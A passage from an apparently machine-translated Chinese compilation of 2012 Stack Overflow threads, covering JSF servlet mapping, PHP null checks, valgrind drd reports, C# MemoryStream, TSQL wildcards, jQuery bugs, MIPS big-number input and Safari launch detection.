    <param-value>true</param-value>
</context-param>

<context-param>
<param-name>javax.faces.VALIDATE_EMPTY_FIELDS</param-name>
<param-value>false</param-value>
</context-param>

<context-param>
<param-name>com.icesoft.faces.concurrentDOMViews</param-name>
<param-value>false</param-value>
</context-param>

<context-param>
<param-name>com.icesoft.faces.synchronousUpdate</param-name>
<param-value>false</param-value>
</context-param>

<context-param>
<param-name>com.icesoft.faces.blockingRequestHandler</param-name>
<param-value>icefaces</param-value>
</context-param>

<context-param>
<param-name>com.icesoft.faces.checkJavaScript</param-name>
<param-value>false</param-value>
</context-param>

  <!-- filters.xml : Non-XDoclet filter declarations, merged into web.xml by XDoclet. -->

    <servlet-mapping>
        <servlet-name>Faces Servlet</servlet-name>
        <url-pattern>*.xhtml</url-pattern>
    </servlet-mapping>

    <servlet-mapping>
        <servlet-name>Resource Servlet</servlet-name>
        <url-pattern>/xmlhttp/*</url-pattern>
    </servlet-mapping>

</web-app> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T08:40:00.843

您的 URL 和 servlet 映射有些混乱。您已请求后缀为 .jsp 的 JSF 页面。因此，所有资源请求都重用此前缀：

获取[http://demo:2008/javax.faces.resource/util/ace-components.js](http://demo:2008/javax.faces.resource/util/ace-components.js)。**jsp** ?ln=icefaces.ace

我的猜测是您以某种方式将原始请求映射到 faces servlet，但随后的资源请求无法匹配映射模式。

我推荐两件事：不要使用 .jsp 作为 JSF 页面请求的扩展。将其设为 .jsf 或其他未使用的文件。然后确保你有正确的 servlet 映射，将此扩展映射到 faces servlet：

```
<servlet-mapping>
  <servlet-name>Faces Servlet</servlet-name>
  <url-pattern>*.jsf</url-pattern>
</servlet-mapping> 
```

# php - PHP 如果值为空，则发送电子邮件

> ID：10078332
> 
> 赞同：0
> 
> 时间：2012-04-09T19:06:44.697
> 
> 标签：php, comparison-operators

`referral_1`我有一个处理表单的 PHP 脚本，但如果用户输入了一组特定字段（ 、、`referral_2`等）的任何信息，我想发送一封特定的确认电子邮件。

现在我有这个来检查用户是否在推荐字段（文本输入）中输入了任何信息：

```
if($referral_1 or $referral_2 or $referral_3 or $referral_4 or $referral_5 == null) {
    $autosubject = stripslashes($autosubject);
    $automessage = stripslashes($automessage);
    mail($email,"$autosubject","$automessage","From: $recipientname <$recipientemail>");
}

if($referral_1 or $referral_2 or $referral_3 or $referral_4 or $referral_5 != null) {
    $autosubject = stripslashes($autosubject);
    $automessage = stripslashes($automessage);
    mail($email,"$autosubject2","$automessage2","From: $recipientname <$recipientemail>");
} 
```

但是当用户完成推荐字段时，它会发送两封电子邮件。当他们不输入任何推荐信息时，它似乎工作得很好（他们只会收到指定的确认电子邮件）。知道我做错了什么吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T19:09:34.477

PHP 布尔比较不能以这种方式工作。您不能将它们与第一个或最后一个参数进行比较。相反，您需要类似的东西：

```
// Build an array of all the values and test NULL appears in the array
if(in_array(NULL, array($referral_1, $referral_2, $referral_3, $referral_4, $referral_5)) {

// ADDED:
// To test if any value is NOT NULL, you can't use in_array(). Instead you can use
// array_filter() and check if the output array has any values
// This is complicated, and unless there are a lot of values to check, I'd probably just write
// out all each one longhand...
if (count(array_filter(array($referral_1, $referral_2, $referral_3, $referral_4, $referral_5), function($v) {return !is_null($v);})) > 0) {
   // There's a non-null
} 
```

**注意**要像这样使用匿名函数`array_filter()`需要 PHP 5.3。

或者把它们写出来，并对它们进行完整的比较：

```
if($referral_1 === NULL or $referral_2 === NULL or $referral_3 === NULL or $referral_4 === NULL or $referral_5 === null) { 
```

按照您的方式进行操作，PHP 的短路评估接管，列表中的第一个*非空*值返回 TRUE，使整个事情为 TRUE。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-09T19:13:36.303

如果这些变量直接来自 $_POST，那么它们永远不会为空，例如像这样的 url

```
http://example.com/script.php?field= 
```

会产生

```
$_GET['field'] = ''; 
```

并包含一个空字符串，而不是一个空值。

除此之外，您的逻辑有问题，它被解析为：

```
if (($referral_1 != '') or ($referral_2 != '') etc...) 
```

为了使您的语句起作用，您需要将这些`or`位括起来，因为`or`它的优先级低于`==`，所以...

```
if (($referral_1 or .... or $referal_5) == null) {
    ^---                              ^--- new brackets 
```

这打开了另一罐蠕虫。该`or`序列将产生一个布尔值 true 或 false，而不是`null`. 所以，你真正想要的只是：

```
if ($referral_1 or ... $referal_5) {
   ... a referal was specified in at least ONE of those fields.
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-09T19:09:25.747

您必须单独检查每个引用变量以查看它们是否为空：

```
if(is_null($referral_1) || is_null($referral_2) || is_null($referral_3) || is_null($referral_4) || is_null($referral_5)) { 
```

我也建议使用[`is_null`](http://us3.php.net/manual/en/function.is-null.php)而不是`== null`

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-09T19:12:08.390

我会利用 isset() 如果值为 null 则返回 false 的事实，并且它可以检查多个值：

```
if (isset($referral_1, $referral_2, $referral_3, $referral_4, $referral_5)) {
 // all values are not-null
} else {
 // at least one value is not null
} 
```

如果要检查所有值是否为空：

```
if (is_null($referral_1) and is_null($referral_2) and is_null($referral_3) and is_null($referral_4) and is_null($referral_5)) {
// all values are null
} 
```

# c++ - valgrind drd 报告带有 boost::thread 或 pthread 的简单 c++ 程序的错误

> ID：10078338
> 
> 赞同：3
> 
> 时间：2012-04-09T19:06:51.303
> 
> 标签：c++, boost, pthreads, valgrind, boost-thread

[我只是从 boost http://www.boost.org/doc/libs/1_31_0/libs/thread/example/thread_group.cpp](http://www.boost.org/doc/libs/1_31_0/libs/thread/example/thread_group.cpp)复制一个示例程序

```
#include <boost/thread/thread.hpp>
#include <iostream>

int shared_counter = 0;
boost::mutex mutex;

void increment_count()
{
    boost::mutex::scoped_lock lock(mutex);
    std::cout << "count = " << ++shared_counter << std::endl;
}

int main(int argc, char* argv[])
{
    boost::thread_group threads;
    for (int i = 0; i < 10; ++i)
        threads.create_thread(&increment_count);
    threads.join_all();
} 
```

并运行它

```
valgrind --tool=drd thread_group 
```

它报告了许多错误，如下所示：

```
==1454== Thread 2:
==1454== Conflicting load by thread 2 at 0x100843650 size 4
==1454==    at 0x1006FD94E: putc (in /usr/lib/libSystem.B.dylib)
==1454==    by 0x1005C0A18: std::ostream::put(char) (in /usr/lib/libstdc++.6.0.9.dylib)
==1454==    by 0x1005C0AC6: std::basic_ostream<char, std::char_traits<char> >& std::endl<char, std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&) (in /usr/lib/libstdc++.6.0.9.dylib)
==1454==    by 0x10001BD32: increment_count() (libfbj.cpp:23)
==1454==    by 0x10001CCD6: boost::detail::thread_data<void (*)()>::run() (thread.hpp:62)
==1454==    by 0x10053DF17: thread_proxy (in /opt/local/lib/libboost_thread.dylib)
==1454==    by 0x1001005A5: vgDrd_thread_wrapper (drd_pthread_intercepts.c:341)
==1454==    by 0x1006AEFD5: _pthread_start (in /usr/lib/libSystem.B.dylib)
==1454==    by 0x1006AEE88: thread_start (in /usr/lib/libSystem.B.dylib)
==1454== Allocation context: Data section of /usr/lib/libSystem.B.dylib
==1454== Other segment start (thread 1)
==1454==    at 0x100102286: pthread_mutex_unlock (drd_pthread_intercepts.c:665)
==1454==    by 0x10001EBDE: boost::mutex::unlock() (mutex.hpp:72)
==1454==    by 0x10001EE5C: boost::unique_lock<boost::mutex>::~unique_lock() (locks.hpp:403)
==1454==    by 0x10001F097: boost::shared_mutex::lock() (shared_mutex.hpp:137)
==1454==    by 0x10001F10E: boost::lock_guard<boost::shared_mutex>::lock_guard(boost::shared_mutex&) (locks.hpp:257)
==1454==    by 0x10001F751: boost::thread* boost::thread_group::create_thread<void (*)()>(void (*)()) (thread_group.hpp:41)
==1454==    by 0x10001BC3F: main (libfbj.cpp:30)
==1454== Other segment end (thread 1)
==1454==    at 0x1006AEE52: __bsdthread_create (in /usr/lib/libSystem.B.dylib)
==1454==    by 0x100106D8E: pthread_create (drd_pthread_intercepts.c:457)
==1454==    by 0x10053D78A: boost::thread::start_thread() (in /opt/local/lib/libboost_thread.dylib)
==1454==    by 0x10001F31A: boost::thread::thread<void (*)()>(void (*)(), boost::disable_if<boost::is_convertible<void (*&)(), boost::detail::thread_move_t<void (*)()> >, boost::thread::dummy*>::type) (thread.hpp:205)
==1454==    by 0x10001F771: boost::thread* boost::thread_group::create_thread<void (*)()>(void (*)()) (thread_group.hpp:42)
==1454==    by 0x10001BC3F: main (libfbj.cpp:30)
...
==1454== ERROR SUMMARY: 49 errors from 6 contexts (suppressed: 215 from 39) 
```

我使用 Mac OS X 10.6.8、Xcode 3.2.4 64 位、gcc 4.2.1、项目设置“Other C++ FLAGs”-pthread、由“sudo port install valgrind”安装的 valgrind 3.7.0，以及 boost 1.49 编译 w /

```
sudo ./bjam variant=debug define=BOOST_LOG_USE_CHAR architecture=combined address-model=32_64 link=shared,static threading=multi install 
```

我也试过pthread，这是程序

```
#include <pthread.h>
#include <assert.h>
#include <iostream>

#define NUM_THREADS 5

pthread_mutex_t m_mutex;

void *TaskCode(void *argument)
{
    pthread_mutex_lock(&m_mutex);
    std::cout << "Hello World! It's me, thread " << *((int *) argument) << std::endl;
    pthread_mutex_unlock(&m_mutex);
    return NULL;
}

int main(void)
{
    pthread_mutex_init(&m_mutex,0);
    pthread_t threads[NUM_THREADS];
    int thread_args[NUM_THREADS];
    int rc, i;

    // create all threads 
    for (i=0; i<NUM_THREADS; ++i) {
        thread_args[i] = i;
        rc = pthread_create(&threads[i], NULL, TaskCode, (void *) &thread_args[i]);
        assert(0 == rc);
    }

    // wait for all threads to complete
    for (i=0; i<NUM_THREADS; ++i) {
        rc = pthread_join(threads[i], NULL);
        assert(0 == rc);
    }

    pthread_mutex_destroy(&m_mutex);
    return 0;
} 
```

然后“g++ -pthread -lpthread threaded_group.cpp -o threaded_group”和“valgrind --tool=drd --dsymutil=yes ./threaded_group”并得到错误：

```
==71472== Thread 2:
==71472== Conflicting load by thread 2 at 0x1001fd650 size 4
==71472==    at 0x1000933DB: fwrite (in /usr/lib/libSystem.B.dylib)
==71472==    by 0x1002ADAE3: void std::__ostream_write<char, std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*, long) (in /usr/lib/libstdc++.6.0.9.dylib)
==71472==    by 0x1002ABB97: std::basic_ostream<char, std::char_traits<char> >& std::__ostream_insert<char, std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*, long) (in /usr/lib/libstdc++.6.0.9.dylib)
==71472==    by 0x1002ABC57: std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*) (in /usr/lib/libstdc++.6.0.9.dylib)
==71472==    by 0x100000C46: TaskCode(void*) (in ./threaded_group)
==71472==    by 0x1000145A5: vgDrd_thread_wrapper (drd_pthread_intercepts.c:341)
==71472==    by 0x100068FD5: _pthread_start (in /usr/lib/libSystem.B.dylib)
==71472==    by 0x100068E88: thread_start (in /usr/lib/libSystem.B.dylib)
==71472== Allocation context: Data section of /usr/lib/libSystem.B.dylib
==71472== Other segment start (thread 1)
==71472==    at 0x10001AE58: pthread_create (drd_pthread_intercepts.c:468)
==71472==    by 0x100000B70: main (in ./threaded_group)
==71472== Other segment end (thread 1)
==71472==    at 0x100068E52: __bsdthread_create (in /usr/lib/libSystem.B.dylib)
==71472==    by 0x10001AD8E: pthread_create (drd_pthread_intercepts.c:457)
==71472==    by 0x100000B70: main (in ./threaded_group)
==71472== Other segment start (thread 1)
==71472==    at 0x10001AE58: pthread_create (drd_pthread_intercepts.c:468)
==71472==    by 0x100000B70: main (in ./threaded_group)
==71472== Other segment end (thread 1)
==71472==    at 0x100068E52: __bsdthread_create (in /usr/lib/libSystem.B.dylib)
==71472==    by 0x10001AD8E: pthread_create (drd_pthread_intercepts.c:457)
==71472==    by 0x100000B70: main (in ./threaded_group)
==71472== Other segment start (thread 1)
==71472==    at 0x10001AE58: pthread_create (drd_pthread_intercepts.c:468)
==71472==    by 0x100000B70: main (in ./threaded_group)
==71472== Other segment end (thread 1)
==71472==    at 0x100068E52: __bsdthread_create (in /usr/lib/libSystem.B.dylib)
==71472==    by 0x10001AD8E: pthread_create (drd_pthread_intercepts.c:457)
==71472==    by 0x100000B70: main (in ./threaded_group)
...
==71472== ERROR SUMMARY: 11 errors from 6 contexts (suppressed: 70 from 29) 
```

谁能告诉我怎么了？

# javascript - 谷歌地图集群在标记点击时显示气泡

> ID：10078339
> 
> 赞同：0
> 
> 时间：2012-04-09T19:06:54.627
> 
> 标签：javascript, google-maps, google-maps-api-3

我希望使用 Google Maps API V3 功能“MarkerClusterer”（http://google-maps-utility-library-v3.googlecode.com/svn/tags/markerclusterer/1.0/examples/advanced_example.html）我有这一切工作并提取 JSON 数据，但我无法在`markers`. 现在澄清一下`clusters`它们应该正常工作，但是当你深入到 a`cluster`并看到`markers`我希望能够单击`marker`并在`marker`.

我创建了一个 JSFiddle [http://jsfiddle.net/helpinspireme/B3a86/](http://jsfiddle.net/helpinspireme/B3a86/) 我尝试添加`marker`调用以显示气泡信息，例如[http://gmaps-samples-v3.googlecode.com/svn/trunk/single-infowindow/ single-infowindow.html](http://gmaps-samples-v3.googlecode.com/svn/trunk/single-infowindow/single-infowindow.html)但我没有成功混合两者。任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T19:33:01.300

你试过什么？[只需像在](https://google-developers.appspot.com/maps/documentation/javascript/examples/infowindow-simple?hl=cs)谷[歌基本示例](https://developers.google.com/maps/documentation/javascript/examples/?hl=cs)中一样正常添加 InfoWindow 即可！

[http://jsfiddle.net/B3a86/2/](http://jsfiddle.net/B3a86/2/)

# c# - 基于类似于来自java的ByteBuffer的字节集合

> ID：10078348
> 
> 赞同：8
> 
> 时间：2012-04-09T19:07:19.400
> 
> 标签：c#, java, bytebuffer

我需要一个与 Java 中的 ByteBuffer 类似的 C# 实现。感兴趣的方法 - .remaining() - 返回当前位置和限制之间的元素数。- .array() - .clear() - .put(byte[], int, int)

我开始了一些`MemoryStream`..但没有`clear()`，还有很多即兴创作另外，我在 Koders 上找到了 ac# 实现：[http](http://www.koders.com/csharp/fid2F8CB1B540E646746D3ADCB2B0AC867A0A8DCB06.aspx?s=socket#L2) ://www.koders.com/csharp/fid2F8CB1B540E646746D3ADCB2B0AC867A0A8DCB06.aspx?s=socket#L2 .. 我会使用..但也许你们知道更好的东西

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2012-04-09T19:31:42.553

`MemoryStream`可以做你想做的一切：

*   `.array()`=>`.ToArray()`
*   `.clear()`=>`.SetLength(0)`
*   `.put(byte[], int, int)`=>`.Write(byte[], int, int)`
*   `.remaining()`=>`.Length - .Position`

如果需要，可以为`Clear`and创建扩展方法`Remaining`：

```
public static class MemoryStreamExtensions
{
    public static void Clear(this MemoryStream stream)
    {
        stream.SetLength(0);
    }

    public static int Remaining(this MemoryStream stream)
    {
        return stream.Length - stream.Position;
    }
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-09T19:32:59.070

MemoryStream 应该有你正在寻找的一切。结合 BinaryWriter 写入不同的数据类型。

```
var ms = new MemoryStream();
ms.SetLength(100);

long remaining = ms.Length - ms.Position; //remaining()

byte[] array = ms.ToArray(); //array()

ms.SetLength(0); //clear()

ms.Write(buffer, index, count); //put(byte[], int, int) 
```

* * *

## 回答 #3

> 赞同：-4
> 
> 时间：2012-04-09T19:11:55.253

你在找一个`Queue<T>`吗？

[http://msdn.microsoft.com/en-us/library/7977ey2c.aspx](http://msdn.microsoft.com/en-us/library/7977ey2c.aspx)

对于 Queue 不支持的一些方法，编写一个包装 Queue 的自定义类可能很容易。

# sql - TSQL，确保@符号前至少出现一个字符

> ID：10078350
> 
> 赞同：3
> 
> 时间：2012-04-09T19:07:21.763
> 
> 标签：sql, regex, tsql

在 TSQL 中，如果我要搜索有效的 .com 电子邮件地址，我需要确保有一个 @ 符号，它以 .com 结尾，并且 @ 前后至少有一个字符。

```
SELECT * FROM CUSTOMER WHERE [EMAIL] LIKE '%@%.com';" 
```

我不相信上述查询会满足确保@ 符号前后至少有一个字符的要求（在第二种情况下，在 .com 符号之前）。如何在此示例中调整通配符以表示每个 % 符号所在的“任何 1 个或多个字符的序列”？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-09T19:08:56.460

使用[下划线字符](http://msdn.microsoft.com/en-us/library/ms179859.aspx)来匹配强制的单个字符，并结合`%`可选的附加字符来匹配。

```
LIKE '_%@_%.com';" 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T19:16:08.067

```
SELECT * FROM CUSTOMER WHERE EMAIL LIKE _%@%_.com; 
```

这可能满足您的要求，因为 _ 用于表示强制字符。

# jquery - jQuery 返回 NaN

> ID：10078352
> 
> 赞同：0
> 
> 时间：2012-04-09T19:07:26.023
> 
> 标签：jquery, nan

我有一个问题 - 当我完成两个字段（输入 1 和输入 2）并尝试更改其中一个时，jQuery 返回 NaN 。有人能帮助我吗？

我尝试使用 parseInt、parseFloat 但它仍然不起作用

对不起我的英语不好：]

js：

```
$(document).ready(function(){
    $('input[name^="input"]').keypress(function(event) {
        if(event.which && (event.which < 48 || event.which > 57)) {
            event.preventDefault();
        }
    });

    var $tabs = $('input[name^="tab"]');
    $.each($tabs, function(i, a) { $(a).val(''); });

    $('input[name^="input"]').keyup(function() {
         var count = parseInt($(this).val());

         if($(this).attr('name') == 'input1') {
             var newValue = count * parseFloat($('input[name="tab1_hidden"]').val());
             $('input[name="tab1"]').val(newValue);
        }

         if($(this).attr('name') == 'input2') {
            $.each($tabs, function(i, a) {
                if(i > 0) {
                    var inputHidden = $(a).attr('name') + '_hidden';
                    var newValue = count * parseFloat($('input[name="' + inputHidden + '"]').val());
                    $(a).val(newValue);
                }
            });
         }

    });
}); 
```

HTML：

```
<form action="" method="post"><div>
<p>input 1: <input type="text" name="input1" value=""></p>
<p> <input type="hidden" name="input1_hidden" value=""></p>
<p>input 2: <input type="text" name="input2" value=""></p>
<p> <input type="hidden" name="input2_hidden" value=""></p>
<p>&nbsp;</p>
<p>tab 1: <input type="text" name="tab1" value=""></p>
<p><input type="hidden" name="tab1_hidden" value="10"></p>

<p>tab 2: <input type="text" name="tab2" value=""></p>
<p> <input type="hidden" name="tab2_hidden" value="20"></p>

<p>tab 3: <input type="text" name="tab3" value=""></p>
<p> <input type="hidden" name="tab3_hidden" value="30"></p>

<p>tab 4: <input type="text" name="tab4" value=""></p>
<p> <input type="hidden" name="tab4_hidden" value="40"></p>

<p>tab 5: <input type="text" name="tab5" value=""></p>
<p> <input type="hidden" name="tab5_hidden" value="50"></p>

<p>tab 6: <input type="text" name="tab6" value=""></p>
<p> <input type="hidden" name="tab6_hidden" value="60"></p>

<p>tab 7: <input type="text" name="tab7" value=""></p>
<p> <input type="hidden" name="tab7_hidden" value="70"></p>

<p>tab 8: <input type="text" name="tab8" value=""></p>
<p> <input type="hidden" name="tab8_hidden" value="80"></p>
</div>
</form> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T20:19:57.527

**Updated:**

js:

```
 count = 0

$("input=[name='input1'], input=[name='input2']").change(function(){
    if ($(this).attr("name") == "input1") {
       count = $("input=[name='tab1_hidden']").val();
       value1 = count * parseInt($(this).val())
       $("input[name='tab1']").val(value1);            
    }

    if ($(this).attr("name") == "input2") {
        value2 = $(this).val();
        countArray = [];

        i = 0

        $(".hidden").each(function() {               
            countArray[i] = $(this).val();               
            i++;
        });

       $("input=[name='tab2']").val(value2 * countArray[0]);
       $("input=[name='tab3']").val(value2 * countArray[1]);
       $("input=[name='tab4']").val(value2 * countArray[2]);
       $("input=[name='tab5']").val(value2 * countArray[3]);
       $("input=[name='tab6']").val(value2 * countArray[4]);
       $("input=[name='tab7']").val(value2 * countArray[5]);
       $("input=[name='tab8']").val(value2 * countArray[6]);

        }
    });        
}); 
```

html:

```
<form action="" method="post"><div>
<p>input 1: <input type="text" name="input1" value=""></p>
<p> <input type="hidden" name="input1_hidden" value=""></p>
<p>input 2: <input type="text" name="input2" value=""></p>
<p> <input type="hidden" name="input2_hidden" value=""></p>
<p>&nbsp;</p>
<p>tab 1: <input type="text" name="tab1" value=""></p>
<p><input type="hidden" name="tab1_hidden" value="10"></p>

<p>tab 2: <input type="text" name="tab2" value=""></p>
<p> <input type="hidden" class="hidden" name="tab2_hidden" value="20"></p>

<p>tab 3: <input type="text" name="tab3" value=""></p>
<p> <input type="hidden" class="hidden" name="tab3_hidden" value="30"></p>

<p>tab 4: <input type="text" name="tab4" value=""></p>
<p> <input type="hidden" class="hidden"  name="tab4_hidden" value="40"></p>

<p>tab 5: <input type="text" name="tab5" value=""></p>
<p> <input type="hidden" class="hidden"  name="tab5_hidden" value="50"></p>

<p>tab 6: <input type="text" name="tab6" value=""></p>
<p> <input type="hidden" class="hidden"  name="tab6_hidden" value="60"></p>

<p>tab 7: <input type="text" name="tab7" value=""></p>
<p> <input type="hidden" class="hidden"  name="tab7_hidden" value="70"></p>

<p>tab 8: <input type="text" name="tab8" value=""></p>
<p> <input type="hidden" class="hidden"  name="tab8_hidden" value="80"></p>
</div>
</form> 
```

[http://jsfiddle.net/F6Kht/4/](http://jsfiddle.net/F6Kht/4/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T19:13:10.000

`$('input[name="tab1_hidden"]').val()`是一个空字符串；如果你`parseFloat`是它，它是一个`NaN`. 用 a 做任何算术运算，`NaN`它会感染它接触到的所有东西。

# input - 在 MIPS 程序集中加载大于 32 位的整数

> ID：10078355
> 
> 赞同：0
> 
> 时间：2012-04-09T19:07:30.787
> 
> 标签：input, mips, mips32

我正在做一个学校项目（如果你不能仅仅因为我使用 MIPS 和 QTSpim 就知道的话），我的团队选择为大（128 位）数字制作一个计算器。我们知道如何对 128 位数字进行操作，但我们遇到的问题是用户输入。

教授不太清楚该怎么做，那么有谁知道是否有办法使用 MIPS 和 QTSimp 加载 128 位整数？

MIPS 寄存器保存 32 位整数，因此结果必须存储在 4 个寄存器中，但有没有办法做到这一点？

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T19:28:39.023

我会：

*   将用户输入读取为字符串
*   将每个数字的ASCII码转换为数字0-9（即减去'0'）
*   应用从基数 10 到基数 2 的基数转换，并将结果保存在四个 32 位字中

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-15T17:14:18.137

为什么 8、16、32、64、128 位之间存在差异？正如 gusbro 所描述的，您验证字符串，对于每个新数字字符乘以 10 并添加新数字。您已经提到您知道如何对 128 位数字进行运算，所以......只需进行运算、乘法和加法即可。如果您不知道如何进行操作，那么您将乘以 10，即 0xA 即 0b1010。使用小学数学，从个数列开始 0 次任何值都为零。电源 1 列的基础（小学 10 秒，这里的双列）1 次任何事物本身，但您移动到一个位置。四列是零，八列是 1 所以添加 abcd 左移三列

```
 abcd
   x1010
   =====
    0000
   abcdx
  0000xx
 abcdxxx 
```

所以乘以 10 与将左移 1 的数字加上左移 3 的数字相乘相同，使用 32 位寄存器移位和添加无限位数相当容易。如果需要一次执行 16 或 24 位，则将第 17 位或第 24 位作为进位位。

如果您没有办法将 128 位相乘和相加，那么使用 128 位计算器就不会走得太远，所以上述内容可能是不必要的。

# javascript - 悬停过快如何避免子菜单混杂？

> ID：10078356
> 
> 赞同：2
> 
> 时间：2012-04-09T19:07:44.803
> 
> 标签：javascript, jquery, html

我有这个 HTML 代码：

```
<ul class="navigation-links">
                    <li class="link-item">
                        <img src="images/new-menu/menu-item_04.png" width="150" height="41" alt="" />
                        <div style="display: none" class="sub-menu">
                            <div class="sub-col">
                                <img src="images/new-menu/home.png" width="46" height="14" alt="" />
                                <ul>
                                    <li>item</li>
                                    <li>item</li>
                                    <li>item</li>
                                    <li>item</li>
                                    <li>item</li>
                                    <li>item</li>
                                </ul>
                            </div>
                            <div class="sub-col">
                                <img src="images/new-menu/home.png" width="46" height="14" alt="" />
                                <ul>
                                     <li>item</li>
                                    <li>item</li>
                                    <li>item</li>
                                    <li>item</li>
                                </ul>
                            </div>
                            <div class="sub-col">
                                <img src="images/new-menu/sataer.png" width="124" height="17" alt="" />
                                <ul>
                                    <li>item</li>
                                    <li>item</li>
                                    <li>item</li>
                                    <li>item</li>
                              </ul>
                          </div>
                            <div class="clear"></div>
                        </div>
                    </li>
                    <li class="link-item">
                        <img src="images/new-menu/menu-item_03.png" width="154" height="41" alt="" />
                        <div style="display:none" class="sub-menu index-menu-col2">
                            <div class="sub-col">
                                <img src="images/new-menu/decor.png" width="53" height="15" alt="" />
                                <ul>
                                  <li>item</li>
                                    <li>item</li>
                                    <li>item</li>
                                    <li>item</li>
                                    <li>item</li>
                                    <li>item</li>
                                    <li>item</li>
                                    <li>item</li>
                              </ul>
                          </div>
                            <div class="sub-col">
                                <img src="images/new-menu/acc.png" width="94" height="15" alt="" />
                                <ul>
                                  <li>item</li>
                                    <li>item</li>
                                    <li>item</li>
                                    <li>item</li>
                                    <li>item</li>
                                    <li>item</li>
                              </ul>
                          </div>
                            <div class="sub-col">
                                <img src="images/new-menu/out-decor.png" width="120" height="17" alt="" />
                                <ul>
                                    <li>item</li>
                                    <li>item</li>
                                    <li>item</li>
                                    <li>item</li>
                              </ul>
                          </div>
                            <div class="clear"></div>
                        </div>
                    </li>
                    <li class="link-item">
                        <img src="images/new-menu/menu-item_02.png" width="152" height="41" alt="" />
                        <div style="display: none" class="sub-menu index-menu-col3">
                            <div class="sub-col">
                                <img src="images/new-menu/lighting.png" width="35" height="16" alt="" />
                                <ul>
                                  <li>item</li>
                                    <li>item</li>
                                    <li>item</li>
                                    <li>item</li>
                              </ul>
                          </div>
                            <div class="sub-col">
                                <img src="images/new-menu/electric.png" width="106" height="19" alt="" />
                                <ul>
                                    <li>item</li>
                                    <li>item</li>
                                    <li>item</li>
                                    <li>item</li>
                                    <li>item</li>
                                    <li>item</li>
                                    <li>item</li>
                              </ul>
                          </div>
                          <div class="clear"></div>
                        </div>
                    </li>
                    <li class="link-item"><img src="images/new-menu/menu-item_01.png" width="151" height="41" alt="" /></li>
                </ul> 
```

和这个 JavaScript 代码：

```
$(document).ready(function(e) {
$(".link-item").hover(function(e) {
    $(this).children(".sub-menu").slideDown("slow");
});
$(".link-item").mouseleave(function(e) {
    $(this).children(".sub-menu").slideUp("fast");
}); 
```

});

这个菜单工作得很好，但是当在菜单栏上悬停太快时，每个菜单都会快速出现和消失，看起来很丑。

我认为解决方案是停止向下滑动事件，直到所有向上滑动事件停止，但我不知道该怎么做。

如果还有其他解决方案，我准备尝试一下。

[演示网站](http://www.mfrsht.com/demo/demo.php)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T20:29:26.720

看看[hoverIntent](http://cherne.net/brian/resources/jquery.hoverIntent.html)。它做了一些逻辑来确保你的悬停看起来是故意的，比如在项目上放慢速度等。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T20:26:56.490

我修改了你的代码。尝试这个 ：

```
$(document).ready(function(e) {
$(".link-item").hover(function(e) {
    $(this).children(".sub-menu").stop(true,false).slideDown("slow");
});
$(".link-item").mouseleave(function(e) {
    $(this).children(".sub-menu").stop(true,false).slideUp("fast");
});

}); 
```

# macos - 检测 Safari 何时启动

> ID：10078369
> 
> 赞同：0
> 
> 时间：2012-04-09T19:08:24.710
> 
> 标签：macos, cocoa, notifications

每当启动 Safari 时，我都试图让我的 mac 应用程序执行某些操作。检测 Safari 启动的明显方法是轮询正在运行的进程。有一个更好的方法吗？

我在想可能有一些 API 可以用来注册回调，或者可能有一个我可以观察到的通知中心事件。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T19:20:40.993

您可以将自己添加到`NSWorkspace`的通知中心作为`NSWorkspaceDidLaunchApplicationNotification`. 当您收到通知时，检查`NSRunningApplication`它提供的实例（通知的 userInfo 中的对象 key `NSWorkspaceApplicationKey`）以确定它是否是 Safari 启动的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T19:25:42.350

检查[NSDistributedNotificationCenter](http://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSDistributedNotificationCenter_Class/Reference/Reference.html)和[NSWorkspace](http://developer.apple.com/library/mac/#documentation/Cocoa/Reference/ApplicationKit/Classes/NSWorkspace_Class/Reference/Reference.html#//apple_ref/occ/instm/NSWorkspace/notificationCenter)类。

以下帖子可能会有所帮助：[如何在 Mac OS X 中侦听应用程序启动事件？](https://stackoverflow.com/questions/4304647/how-to-listen-for-an-application-launch-event-in-mac-os-x)

# jquery - 使用 FitText jquery 插件调整文本大小

> ID：10078373
> 
> 赞同：4
> 
> 时间：2012-04-09T19:08:45.790
> 
> 标签：jquery, jquery-plugins, responsive-design

我正在尝试使用 FitText jquery 插件来调整一些文本的大小。问题是文本仅在窗口调整大小事件后才被炸毁。

```
// Resizer() resizes items based on the object width divided by the compressor * 10
            var resizer = function () {
                $this.css('font-size', Math.max(Math.min($this.width()     / (compressor*10), parseFloat(settings.maxFontSize)), parseFloat(settings.minFontSize)));
            };

            // Call once to set.
            resizer(); 
```

看起来脚本最初至少调用了一次“调整大小”函数。我在这里错过了什么吗？

这就是我使用脚本的方式：

```
<script src="/js/jquery.fittext.js"></script>
<script type="text/javascript">

    $("h1").fitText(.6);

</script>
</body> 
```

我对这些东西很陌生，真的只是想把东西放在一起，所以任何帮助都将不胜感激。

***编辑***
